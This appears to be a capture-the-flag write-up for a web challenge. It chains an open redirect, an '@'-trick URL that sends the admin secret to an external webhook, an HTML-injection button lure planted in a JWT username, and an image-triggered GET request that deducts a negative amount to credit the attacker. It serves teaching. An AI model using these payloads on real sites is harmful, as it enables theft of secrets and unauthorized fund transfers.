## Open Redirect to leak admin secret
There is an open redirect in the admin login page. The admin secret is appended to the redirect url. The redirect url is intended to be a google login link, but we can set it to be our own webhook by appending a @ behind the domain to form 
https://accounts.google.com@eo2jsc6xk7y9tec.m.pipedream.net?

Next, we notice that the google login actually hasnt been implemented, and is just placeholder code. When a button is clicked, it is checked wheter the button is a google login button, and if it is, then the user is redirected to the google login url. There is an HTML injection vulnerability in the button. We can set our username in the JWT token to be 
<button id = 'google'>Google Logingadadadadadada</button>
Such that when the admin bot clicks on the button, it triggers the open redirect. 

With the admin secret, we now need a way to add money to ourselves, which can be done using the deduct endpoint. Since only the admin user has the debug token, we need to somehow make him trigger the endpoint. Notice that the deduct endpoint is a get request. This means that any image that is loaded in the admin page will trigger the endpoint. We can use this to our advantage by setting the image source to be /api/admin/Xvlw8ZUiBZcPCvbcKICqtjkqTgRmHtXxXVFiZkiWv0wIykgTWuuC7CKuAGf2bJBT/deduct?amount=-1000000000 which will deduct -1000000000 from our account thus giving us sufficient money to buy the flag.